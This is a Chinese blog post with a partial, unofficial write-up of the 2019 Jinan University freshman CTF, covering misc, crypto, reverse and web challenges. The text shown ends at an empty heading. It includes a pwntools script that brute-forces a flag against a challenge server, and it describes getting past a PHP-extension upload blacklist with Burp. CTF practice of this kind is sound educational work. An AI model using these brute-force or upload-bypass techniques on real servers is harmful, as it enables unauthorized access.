---
title: 2019 年暨南大学“新生杯”CTF Write-Up
date: 2019-11-16 21:50:28
updated: 2019-11-16 21:50:28
excerpt: 非官方/部分 Write-Up，多图，预计消耗流量 3.5MB |•'-'•) ✧
mathjax: true
thumbnail: https://ae01.alicdn.com/kf/H4f96579cce3f4cfdb3ba757207bd95daK.jpg
thumbnail_webp: https://ae01.alicdn.com/kf/Ha943daeb9074416db283e6255212d851N.jpg
thumbnail_avif: https://vfile.meituan.net/mmdb/f5466b32803562f8a149f78934a2e5b461691.jpg
thumbnail_color: data:image/jpeg;base64,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
---

{%
    aplayerlite
    "START：DASH！！"
    "μ's"
    "https://fs-im-kefu.7moor-fs2.com/im/2768a390-5474-11ea-afc9-7b323e3e16c0/s5-qtR3p.m4a"
    "https://ae01.alicdn.com/kf/HTB1W51WNwHqK1RjSZFkq6x.WFXau.jpg"
%}

最近因为各种杂七杂八的事情忙到爆炸，很久都没有更新文章了，被 CTF 折腾也是忙到爆炸的原因之一\_(:\_」∠)\_

这个比赛其实去年小透明参加过，然鹅因为当时~~姿势水平不足~~，结果只能在六七十名的后排位置看菊苣们刷分。

（重在参与，重在参与！）

<img data-src-webp="https://ae01.alicdn.com/kf/H6acc1bb67c93432fa5010866066df1ecU.jpg" data-src="https://ae01.alicdn.com/kf/H30ab574d7d16485192a29e82f4d642adB.jpg">

一年过去了，小透明似乎还是一直都没有真正意义上地“特训”过 CTF（只是在开始前一周把某在线题库的“新手区”过了一遍），结果在比赛前夕突然听说了班上有某君**从暑假开始，每天练习一道 CTF 题**，还是门槛相对较高的**逆向题**的消息，再想到各种“聚沙成塔”“坚持不懈”“不劳无获”“龟兔赛跑”之类的鸡汤……

由于竞争的存在，小透明参赛的动机开始~~被一点点地扭曲~~(｡í _ ì｡) 从一开始的**“过来玩一玩”**变成了各种**“不能被○○超过了”**，到了最后目标变成了**“尝试超过那位已从本校计科专业毕业的传说级菊苣”**，结果就是小透明在这一周用尽了几乎所有的精力来肝比赛，然后……

<img data-src-webp="https://ae01.alicdn.com/kf/Hde8e238f05be46f78c86bba330ce34a1t.jpg" data-src="https://ae01.alicdn.com/kf/Ub97ca8e264c64830a051ff01093953eeZ.png">

虽然得了第一位，但是大概是因为太累了，还有天气变化的关系，结果在比赛进行到后期的时候似乎是感冒了……果然还是不应该勉强自己，周末坐校车回家时头又疼又晕的感觉太难受了ﾍ('.'o)（虽然现在已经没那么不舒服啦）

这是个**非官方**的 Write-Up，内容**仅限于自己当时做出来的部分题目**。官方版的 Write-Up 应该会在[主办方 Xp0int 的博客](http://blog.leanote.com/xp0int)上更新，不过小透明本来就有打算自己写一份放在这里，至少当成一个记录好了～٩(ˊᗜˋ\*)و

> [官方 Write-Up](http://blog.leanote.com/post/xp0int/2019%E6%9A%A8%E5%8D%97%E5%A4%A7%E5%AD%A6-%E5%8D%8E%E4%B8%BA%E6%9D%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup) 已放出，相比这里的非官方 Write-Up 多出了以下题目的题解：
>
> * Misc
>   * orzzzxzz
> * Reverse
>   * binary
> * Web
>   * Image Checker
>   * unserialize
> * pwn
>   * inversion
>   * syscall
>
> ↑都是当时不会做的题（笑）
>
> 另外也公布了题目源码和附件：[xf1les/2019JNUCTF](https://github.com/xf1les/2019JNUCTF)

*题目实在太多了，可以点击左边的“目录”菜单，直接传送到某个题目的 Write-Up～*

---

# Misc

## O N E O F U S

不知道为什么，MPC-HC 直接打开视频本体就是 flag 了，~~所以这题白给 2333~~

<img data-src-webp="https://ae01.alicdn.com/kf/Ha4981586fa5b48a982b7a972168ec1d6R.jpg" data-src="https://ae01.alicdn.com/kf/Uc2c1b990d10d43fea4e29c238fc781c7e.png">

正经的解法：这个 MKV 有两个视频流，flag 藏在某个视频流里面，使用 FFmpeg 就可以把这个流单独拆出来。

```bash
ffmpeg -i oneofus.mkv -map 0:2 -c copy oneofus.jpg
```

## LoLo

蓝色盲水印，出门右转：[GitHub linyacool/blind-watermark](https://github.com/linyacool/blind-watermark/tree/python3)

```bash
decode.py --original lolo_1.png --image lolo_2.png --result lolo_3.png
```

<img data-src-webp="https://ae01.alicdn.com/kf/H18da7c4d49a843c09e05896083981211x.jpg" data-src="https://ae01.alicdn.com/kf/U19a7d709be264d51ab7a7bd55978152bW.png">

不过小透明忍不住想吐槽一下这题，因为……

**完 全 一 致**

实际上这题和去年“新生杯”的类似题用的是同一种盲水印。比赛前还想着“今年是不是又要出一个一模一样的”，没想到真的出了(´ﾟωﾟ｀)

但是去年的[官方 Write-Up](http://blog.leanote.com/post/xp0int/%E6%9F%AF%E5%93%80) 里面都在自我吐槽“这题出的不是很好，有些盲水印脚本无法解出答案，暂时未去了解为什么”了啊！而且周围有不少小伙伴们试过好几种其它的盲水印工具，确实都解不出来，所以这题实际上是在考信息搜索能力……？(='\_'=)

## wewuwewu

首先，这实际上是个 JPEG 图片。然后，翻二进制数据的话……

<img data-src-webp="https://ae01.alicdn.com/kf/Hbbb0371371d640b38e12787e03ef3c6ai.jpg" data-src="https://ae01.alicdn.com/kf/U792671448653417b88e40c28b91e82779.png">

## rainbow

<img data-src-webp="https://ae01.alicdn.com/kf/H41d2b01b50fb45bea22f7b478a8aa617r.jpg" data-src="https://ae01.alicdn.com/kf/H7739931f6438448380be519b567b6ee87.png">

左起，每个色块的颜色和对应的字符：
* 0x000031 1
* 0x300000 0
* 0x003100 1
* 0x000031 1
* 0x630000 c
* 0x006800 h
* 0x000041 A
* 0x730000 s
* 0x000033 3
* 0x5f0000 _
* 0x003100 1
* 0x480000 H
* 0x006500 e
* 0x5f0000 _
* 0x007200 r
* 0x000061 a
* 0x004900 I
* 0x6e0000 n
* 0x000062 b
* 0x003000 0
* 0x000077 w
* 0x002100 !
* 0x000021 !
* 0x003100 1
* 0x000032 2
* 0x003200 2
* 0x000037 7

加上 flag 的头和尾，得到的就是 `flag{1011chAs3_1He_raInb0w!!1227}`。

## NoMansLand

<img data-src-webp="https://ae01.alicdn.com/kf/Hcfee6d848ea040a68b3dc0ad7258a9a7X.jpg" data-src="https://ae01.alicdn.com/kf/U024afe9149fe47deb99b91e1483f02570.png">

~~改一个字就加一个 Commit，这样我的 GitHub 主页上的日历也可以是绿油油的一片啦！~~

## Music

<img data-src-webp="https://ae01.alicdn.com/kf/Hf4acfaa1e15f4e1c9d653a8cfbcdcf81X.jpg" data-src="https://ae01.alicdn.com/kf/Ud0527412a156492ca70f29d9249759430.png">

音符加密（[这里](https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue)是工具），这道题和“与佛论禅”、核心价值观是一个性质……

## carefully

<img data-src-webp="https://ae01.alicdn.com/kf/H60aae98ea6354dca8c47571afb91337cT.jpg" data-src="https://ae01.alicdn.com/kf/U0497674513654a3cb039b5cf395d6481B.png">

核心价值观解密（[这里](https://z.duoluosb.com/)是工具），得到 `g1v_vmxibk1rlm_1h_u4mmb_4m1_45yv11vezyov`，试了各种单表替换密码后发现是密码是反方向字母表，又称 Atbash（[这里](https://tool.bugku.com/jiemi/)是工具），数字和下划线不参与编码（看上去确实是这么回事），最后得到 `flag{t1e_encryp1ion_1s_f4nny_4n1_45be11evable}`。

<img data-src-webp="https://ae01.alicdn.com/kf/Ha2e87479a8e74057ba44c8925555112eJ.jpg" data-src="https://ae01.alicdn.com/kf/U031ce1068e854bedaba00d03ca98137fY.png">

## Guess

个人觉得是 Misc 里最有技术含量的一题，大概是因为需要用到脚本？

<img data-src-webp="https://ae01.alicdn.com/kf/H116bbd6e49074b9d947ede6d03e69865M.jpg" data-src="https://ae01.alicdn.com/kf/Ub502739007b84aa1904517969450d7c5L.png">

用 pwntools 连上服务器，这个藏着的东西大概就是 flag 了，如果输错了会返回 `Oops!`，全部输对了应该会有提示，那如果部分输对了话……

是**没有任何输出**的哦？|･ω･｀)

根据惯例，flag 应该由大小写字母和数字和各种符号组成，开头必然是 `flag{`，剩下的就需要一个个慢慢**爆破**了。

```python
#!/usr/bin/env python

from pwn import *

# 已知的前几个字
flag = 'flag{'
# 为了加快爆破速度，按照字符在 flag 中的出现概率降序排列字符集（滑稽）
charset = 'abcdefghijklmnopqrstuvwxyz0123456789-_ABCDEFGHIJKLMNOPQRSTUVWXYZ{}!'

p = remote('35.194.143.125', 30001)

# 爆破的原理是从字符集中逐个尝试将字符追加到已知的 flag 后面
# 如果错误，下一行就是 Oops!
# 如果正确，下一行就是 I wanna give you sth
# 如果追加的字符是 }，就结束爆破输出 flag
akarin_have_girlfriend = False
while not akarin_have_girlfriend:
    end = False
    for char in charset:
        p.recv()
        p.sendline('4')
        p.recv()
        p.sendline(flag + char)
        result = p.recvline()
        print('Trying: ' + char)
        if result == 'Oops!\n':
            print('Fail.')
        elif result == 'I wanna give you sth\n':
            flag += char
            print('Found! Now Akarin get: ' + flag)
            if char == '}':
                end = True
            break
    if end:
        print('The flag is: ' + flag)
        break
```

<img data-src-webp="https://ae01.alicdn.com/kf/H7c078b8f02604a1fbabc5754a4446b70j.jpg" data-src="https://ae01.alicdn.com/kf/Ub944719cd46f439eb892f6f2ae998ac0Y.png">

`flag{Pyth0n_1s_s0_mmmmmm4g1111calll!!!}`，不过爆破成功了却连个提示语都没有，不应该啊ﾍ('.'o)

~~由此可见，Python 是世界上最好的语言！~~（PHP 党激怒）

## nopan

>“知道百度网盘怎样上传文件吗？”——官方提示

没有尝试过各种手段和在~~即将进入全面小康社会的~~ 9102 年仍然坚持通过限速让用户**梦回二十年前用拨号上网的速度下载文件**的万恶的百度网盘做过斗争的人，大概是做不出这题的|-` )

> 好久不见。上次你提到的那个文件，我已经把它上传到■■网盘里了。网盘链接和提取码如下：
>
> 链接：[https://pan.■■■■■.com/s/1ehuW4C6s16Wm4U91f7kKCw](https://pan.baidu.com/s/1ehuW4C6s16Wm4U91f7kKCw)
> 提取码：■■■■
>
> 最近我很忙，可能要很久才能回复。注意别把链接和提取码搞丢了。

~~但是你真的就弄丢了⊂彡☆))д`)~~

> 最近网盘的下载速度越来越慢了。我担心你文件没有下载完，网络就断开了。以防万一，请校检下载的文件是否符合以下哈希值：
>
> 文件名：■■■■■■■■
> 文件大小: 2865514（2.8MB）
> MD5  : 3571407E1F0D73B789F2232448680CD1
> SHA-1: 0561C239AA1F29A68269FC8A03E442E691CBF6FA
> CRC32: 0E250626

~~你也知道辣鸡百度网盘限速啊？~~

<img data-src-webp="https://ae01.alicdn.com/kf/Hbba04230277d4a4cbbe04c9a0b606f43x.jpg" data-src="https://ae01.alicdn.com/kf/Uba2833a5a2ad46a08f71f591f60e5246y.png">

各种“万能钥匙”并没有什么效果，强行爆破那个分享链接的密码更是不可能的事情。

实际上，分享链接不重要，这几个 Hash 才是重点。题目的附件还有上面这张图片，用 Photoshop 打开会提示“遇到意外的文件尾”等等，显然是图片的数据被强行截断了。当然，分享的文件名应该就是 `flag.png`。

有个命令行版百度网盘客户端 [BaiduPCS-Go](https://github.com/iikira/BaiduPCS-Go) 自带了“手动秒传”的功能。百度网盘秒传的原理是判断文件的长度、完整文件和文件的前 256KB 的 MD5、CRC32。现在这些值都有了，就可以把文件**直接秒传**到自己的网盘上。

“文件的前 256KB 的 MD5”可以通过现在手上的这半截图片再截取前 256KB，然后用各种工具算出来：`875B6EB10090EB3127D206F35A4B277E`

然后使用 BaiduPCS-Go 输入命令：

```bash
ru -length=2865514 -md5=3571407E1F0D73B789F2232448680CD1 -crc32=0E250626 -slicemd5=875B6EB10090EB3127D206F35A4B277E /flag.png
d /flag.png --nocheck
```

就可以下载到原图然后直接看到 `flag{2995_ke3p_clam_and_enj0y_y0ur_fl1ght_300}`，还好不需要继续折腾隐写什么的……

<img data-src-webp="https://ae01.alicdn.com/kf/He19e0f047fda46bdbe1c632ae2ac9f58j.jpg" data-src="https://ae01.alicdn.com/kf/H350d88a8756c4a16a835c08cc48fecd4c.jpg">

（上面这张不是原图，上传到图床前小透明自己把图片压缩了）

# Crypto

## really_encrypted

~~不言而喻，一目了然，真・签到题~~

栅栏密码（[这里](https://www.qqxiuzi.cn/bianma/zhalanmima.php)是工具），`flag{Ai8sh5wbxj0whksjshdyw3}`。

<img data-src-webp="https://ae01.alicdn.com/kf/H9f51e2bbbb8e44b98e11ff9ab1738c61Y.jpg" data-src="https://ae01.alicdn.com/kf/U4b42dff04e3a431daa6b1d096f6189e33.png">

## easyrsa

RSA 解密需要求模除法逆元，从 [Stack Overflow](https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python/29762148#29762148) 上找到了一个非常实用的匿名函数可以直接实现逆元的计算：

```python
MMI = lambda A, n,s=1,t=0,N=0: (n < 2 and t%N or MMI(n, A%n, t, s-A//n*t, N or n),-1)[n<1]
MMI(23, 99) # 56
MMI(18, 24) # -1
```

开始看题：

```plaintext
n = 18166111488983638423176654225038910650374178404043258136863317940757240374883045318227630220114908148002528619687208976201483203446705228237820608531034600157346418730110800833894198105113069673034318791074080878803821797374439187892933762426303490171060652425319592687318992422979831460606780689490127157122450326817694644127955168509718422226505201308410281564018832558025316135527711604948983206569045881358071837726506411561445950018434181828539749068924458242255898899889941894373420604283541696070823346969159662074221543706652525690955057870664198106495869582165707721782854117610672456879034154898769471938117
e = 65537
c = 16557540364154395713558646669072741937615342260542036031952182998548657011824978776677484944354752850867643908247704032511389420321541306432748843707416654616686046776804432102455821985542337552330254302403535524234293479604198963438410959320502344078024576646316377856554837978984863667052517437922967926155676374386985386995490935331458679889799199387332376735566839929210890931308968597230699243910342515468179185950859704753759493976488271753912140439374347388198468842216991965867366259721821413872154269673724400345270897275549939948544776957761650034569256088810092045614520316608497052245790834163200510667772
```

把 n 丢进 [FactorDB](http://factordb.com/index.php?query=18166111488983638423176654225038910650374178404043258136863317940757240374883045318227630220114908148002528619687208976201483203446705228237820608531034600157346418730110800833894198105113069673034318791074080878803821797374439187892933762426303490171060652425319592687318992422979831460606780689490127157122450326817694644127955168509718422226505201308410281564018832558025316135527711604948983206569045881358071837726506411561445950018434181828539749068924458242255898899889941894373420604283541696070823346969159662074221543706652525690955057870664198106495869582165707721782854117610672456879034154898769471938117) 可以分解出 p 和 q，然后就可以得到 m。

```plaintext
p = 130456283857645025762691023898845608928710362686294851221450093824533197549806631148867242691844441160576320773904432512838379590127986113818416101086695539425149571612979342889778360825402727498529748702035429662584726706609716114370652011043194792995908818094170934656989995629482678233000685983090325365549
q = 139250566947059823453625463016686669261826444361819002282335838853816828667839799789393680821194880353192071200076880361361848345889074292932450446910930443112614763933390287115641256150843558712707320218852675477962227409197464100372762134803009018827495653979157431219931338408129724157546988493768646375033
m = 4079298574924100380882798141080777519551699955439474094729924030825463150621200292859549484308473511195982027523392939998962139796530757717099548565227012907221461316960947880602936490993085237650824412891417747519
```

把 m 转换为字符串（这其实是在造轮子了）：

```python
hex_m = hex(m)[2:] # 去掉开头的0x
decoded = ''
for i in range(0, len(hex_m), 2):
    decoded += chr(int(hex_m[i:i+2], 16))
```

得到的字符串是 `0x1337 ^ (-1) mod 0x18a39cb09e40671788a6b9221371e3f5455bbde2aff984e491c85f4f3ad309613 = ?`，所以还需要继续进行计算。

```python
calc = MMI(0x1337, 0x18a39cb09e40671788a6b9221371e3f5455bbde2aff984e491c85f4f3ad309613)
hex_calc = hex(calc)[2:]
decoded = ''
for i in range(0, len(hex_calc), 2):
    decoded += chr(int(hex_calc[i:i+2], 16))
```

<img data-src-webp="https://ae01.alicdn.com/kf/Hed6e0c191cc74da2a9ee3c896c06bfeeG.jpg" data-src="https://ae01.alicdn.com/kf/Hc73b6c2a91da4db28f2b183b23081dcba.jpg">

`flag{456_easy_rsa_challenge_657}`

## My kingdom

还是 Hex 转 ASCII，得到文本：

```plaintext
K ecog, K ucy, K eqpswgtgf.
Eqyctfu fkg ocp{ vkogu dghqtg vjgkt fgcvju,vjg xcnkcpv pgxgt vcuvg qh fgcvj dwv qpeg.
Uckf d{ Lwnkwu Ecguct, Tqocp Ngcfgt
Lwuv nkmg yjcv Ecguct uckf, {qw eqpswgtgf, {qw fgugtxg kv.
hnci{e2o5_ucy_Lq3p_63f_E2psw5tg_evh!}
```

最后一行很像是 flag，经过测试是 +2 的凯撒密码，用 -2 把它复原。

~~因为解密工具抹平了大小写，还无视了数字，结果搞出了一大堆提交失败的记录⊂彡☆))д`)~~

```plaintext
I came, I saw, I conquered.
Cowards die man{ times before their deaths,the valiant never taste of death but once.
Said b{ Julius Caesar, Roman Leader
Just like what Caesar said, {ou conquered, {ou deserve it.
flag{c0m3_saw_Jo1n_41d_C0nqu3re_ctf!}
```

`flag{c0m3_saw_Jo1n_41d_C0nqu3re_ctf!}`

## lincoin

```python
from Crypto.Util.number import bytes_to_long
from FLAG import flag

class LCG:
    a = 0xdb626d86f5dc6cf4ec8c4ca4f4b9dab3
    b = 0xb2dab99e8973e463ab58a4403d35675f
    n = 0xd5aef35973977bd35331490990b6b54b80d44bdb621f861848f4377c54cf6649

    def __init__(self, init_seed):
        assert init_seed < self.n
        self.state = init_seed

    def rand(self):
        self.state = (self.a * self.state + self.b) % self.n
        return self.state

    def __str__(self):
        return str(self.rand())

seed = bytes_to_long(flag)
lcg = LCG(seed)

times = 2 ** 30
while times > 0:
    lcg.rand()
    times -= 1

print(lcg) # 0xaf08e8ece96f637d3719fa1c4f0a9f88b3d330615108dd36f430c159308395b2
```

本体是个[线性同余随机数产生器（LCG）](https://zh.wikipedia.org/zh-hans/%E7%BA%BF%E6%80%A7%E5%90%8C%E4%BD%99%E6%96%B9%E6%B3%95)，把 flag 转为 Hex 然后设为种子，生成了 ${2^{30}}$ 次随机数。

LCG 的原理是：设定参数 a、b、n 以及种子 ${X_0}$，之后的每个随机数按照公式 $$X_n = (a \times X_{n-1} + b) \bmod n$$ 递推生成。

[Stack Overflow](https://stackoverflow.com/questions/2911432/reversible-pseudo-random-sequence-generator) 上面有人写出了“反向 LCG”的算法（当然也可以自己反推），从当前随机数 $X_n$ 反推 LCG 生成的上一个随机数 $X_{n-1}$ 的公式是 $$X_{n-1} = a^{-1} \times (X_n - b) \bmod n$$ 其中 $a^{-1}$ 是 a 的模 n 除法逆元（继续用 `MMI` 函数计算）。

写代码求解，因为循环次数太多，运行需要很长的时间，所以按了回车之后，可以去阳台上看看风景，~~或者和妹子出去散个步什么的~~（你怎么可能会有女朋友？）

```python
def reverse_LCG(rnd):
    # a = 0xdb626d86f5dc6cf4ec8c4ca4f4b9dab3
    b = 0xb2dab99e8973e463ab58a4403d35675f
    n = 0xd5aef35973977bd35331490990b6b54b80d44bdb621f861848f4377c54cf6649
    a_inv = 57217878573518668316807000375554927755910762980319730425669837644426658111070 # MMI(a, n)
    return (a_inv * (rnd - b)) % n

rnd = 0xaf08e8ece96f637d3719fa1c4f0a9f88b3d330615108dd36f430c159308395b2
for i in range(2 ** 30 + 1):
    # 进度条（大误）
    if i % 100000 == 0:
        print('\r' + str(i), end='')
    rnd = reverse_LCG(rnd)

print()
print(rnd)
```

过了很久很久很久很久……终于算出来了，种子是 `180966415225526098453856893299872427450627808844390491008662352366530869117`，继续转字符串，得到 `flag{541_LCG_iS_A_baD_pRng_167}`。

（发现自己做的时候忘了截图，重新算一遍又要好长时间，就不截图了吧）

（其实 `from Crypto.Util.number import bytes_to_long` 是可以直接整数转换为字节的）

# Reverse

## easyRE

<img data-src-webp="https://ae01.alicdn.com/kf/Hcd8d9283bba04da4b458baa0e0723e9ec.jpg" data-src="https://ae01.alicdn.com/kf/U892f389b5a334cb99dd178535224c49ev.png">

IDA 一开，有个字符串 `ZmxhZ3tSM19XMXRoX2I0c2U2NF8xc19zMW1wbGVfMG4zfQ==`，估计是 Base64，实际上真的是 Base64，解码后得到 `flag{R3_W1th_b4se64_1s_s1mple_0n3}`。

## easyELF

<img data-src-webp="https://ae01.alicdn.com/kf/H1012d4b8abfc457dbfe46203f2d6c339M.jpg" data-src="https://ae01.alicdn.com/kf/U398021ae3c344a0ea8934a8597152bc6U.png">

<img data-src-webp="https://ae01.alicdn.com/kf/He859489b13da4e58abaab7b56800008df.jpg" data-src="https://ae01.alicdn.com/kf/U98f4cb8c4c8d45e5aa8860e3da808de1g.png">

用 IDA 打开本体，发现 `sub_4006CB` 比较可疑，再点进去，发现 `v7` 也比较可疑……

<img data-src-webp="https://ae01.alicdn.com/kf/H0eda6b879e48498192e7e15d00cc053ay.jpg" data-src="https://ae01.alicdn.com/kf/Ubaf9eb9d05334c8b92e93ed97d838e8fw.png">

下断点动态调试，flag 保存在了 `v7`：`flag{Here_are_yo_To_be_interested_and_excited}`

~~你们搞的这个比赛啊，excited！~~

## reverseMe

输入一个字符串，这个字符串被进行了一堆操作后将会和 `+wXp+xDkldnFdFNFdxnzdFWpGx2m`（应该就是操作后的 flag）比对。这个应该不是 Base64 了……吗？

<img data-src-webp="https://ae01.alicdn.com/kf/H77ad2c18b3d04164a5c0750e8b4c9592n.jpg" data-src="https://ae01.alicdn.com/kf/Udfa607153f7d4f0c9b3478411ffb38afk.png">

对比一下现有的 C 语言计算 Base64 的代码可以说是完全一致，所以这个操作还是在算 Base64。

<img data-src-webp="https://ae01.alicdn.com/kf/Hb15829b87db14f12a4b57e15be3c7df9U.jpg" data-src="https://ae01.alicdn.com/kf/U73ddfc5b07ec4ec8ac9ee69665f10223D.png">

继续翻变量，可以发现字符表不是 `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/` 而是 `R9Ly6NoJvsIPnWhETYtHe4Sdl+MbGujaZpk102wKCr7/ODg5zXAFqQfxBicV3m8U`，所以继续写代码先转换成出原版 Base64 再拿去解码：

```python
ori = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
mod = 'R9Ly6NoJvsIPnWhETYtHe4Sdl+MbGujaZpk102wKCr7/ODg5zXAFqQfxBicV3m8U'
flag_mod = '+wXp+xDkldnFdFNFdxnzdFWpGx2m'
flag_ori = ''
for i in flag_mod:
    flag_ori += ori[mod.index(i)]
print(flag_ori)
```

<img data-src-webp="https://ae01.alicdn.com/kf/H330650a36f8746149c4f7f7166c95d22X.jpg" data-src="https://ae01.alicdn.com/kf/H5f78eda467704cbe9c0750e31f83f354q.jpg">

转换为原版 Base64 是 `ZmxhZ3tiYXMzXzFzX3MwXzNhc3l9`，解码后得到 `flag{bas3_1s_s0_3asy}`。

顺便看了一下源代码。经过实验，大量出现的 `(unsigned __int64)(0xAAAAAAAAAAAAAAABLL * (unsigned __int128)var >> 64) >> 1` 相当于求 `var` 整除 `3`，具体原理不得而知，~~大概是参考了平方根倒数速算法~~。

<img data-src-webp="https://ae01.alicdn.com/kf/H9d864746dc24418384d40800d5a7f8fcF.jpg" data-src="https://ae01.alicdn.com/kf/Hf15400e638834de1a09b71c4ad68b782q.jpg">

# Web

## BabyUpload

<img data-src-webp="https://ae01.alicdn.com/kf/H9dbcf1e005044e3c86a75a49262dc75aF.jpg" data-src="https://ae01.alicdn.com/kf/U59741b2806bb4d2db60deb7205d550fdj.png">

文件内容不重要，只要在上传的时候把文件名改过来就行～然后就可以得到 `flag{w311_D0ne!}`。

## EasyUpload

~~我差点觉得这题应该叫 DifficultUpload~~

~~比上次多了黑名单验证机制，只要扩展名是 php、php3、php4、php5、php7、pht、phtml 就会 Connection reset。~~

只要用 Burpsuite 抓包改完重发就会出现 Connection reset，原因不明，结果试了一晚上绕过方法，导致这题耽误了很久(｡í _ ì｡)

后来才发现 Burpsuite 还有个 Repeater 能用……

<img data-src-webp="https://ae01.alicdn.com/kf/Hbbaad66de92a4e2697286882d8c1a565a.jpg" data-src="https://ae01.alicdn.com/kf/U7e633395987b42d5a6436de5d7c5e92ai.png">

继续改文件名，然后按照提示在图片数据的无关紧要的位置加 `givemeflag`，就能看到 flag 了：`flag{SHjdbe7pIUD02847SDHD}`。

<img data-src-webp="https://ae01.alicdn.com/kf/H0071122a519f4893ab0479f459f9962eX.jpg" data-src="https://ae01.alicdn.com/kf/U2b06bba9f9934fc79d39e3acd3c31251g.png">

## EasyGame

